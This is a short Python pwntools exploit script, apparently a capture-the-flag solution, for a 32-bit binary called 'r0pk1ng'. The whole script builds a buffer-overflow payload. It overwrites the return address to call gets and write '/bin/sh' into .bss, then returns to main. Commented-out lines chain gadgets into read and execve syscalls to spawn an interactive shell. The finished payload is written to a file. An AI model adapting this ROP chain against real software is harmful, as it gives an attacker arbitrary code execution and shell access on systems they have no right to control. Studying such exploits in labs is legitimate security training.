import pwn
# pwn.context.terminal = ['tmux', 'splitw', '-h']

elf = pwn.context.binary = pwn.ELF("./r0pk1ng")

pop_eax = 0x0804925e
pop_ebx = 0x08049022
pop_ecx = 0x08049262
bss = 0x804c020
call_eax = 0x0804901d
pop_edx = 0x08049264
syscall = 0x08049266
payload = b'A'*0x20
payload += b'B'*4
payload += pwn.p32(elf.plt['gets'])
payload += pwn.p32(elf.sym.main)
payload += pwn.p32(bss)
payload += b'\n'
payload += b'/bin/sh\0'
# payload += pwn.p32(pop_eax)
# payload += pwn.p32(0x3)
# payload += pwn.p32(pop_ebx)
# payload += pwn.p32(0)
# payload += pwn.p32(pop_ecx)
# payload += pwn.p32(bss)
# payload += pwn.p32(pop_edx)
# payload += pwn.p32(0x8)
# payload += pwn.p32(syscall)
# payload += pwn.p32(pop_eax)
# payload += pwn.p32(0xb)
# payload += pwn.p32(pop_ebx)
# payload += pwn.p32(bss)
# payload += pwn.p32(pop_ecx)
# payload += pwn.p32(0x0)
# payload += pwn.p32(pop_edx)
# payload += pwn.p32(0x0)
# payload += pwn.p32(syscall)
# p.sendline(payload)
# p.send(b'/bin/sh\0')
# p.interactive()
f = open('payload', 'wb+')
f.write(payload)
f.close()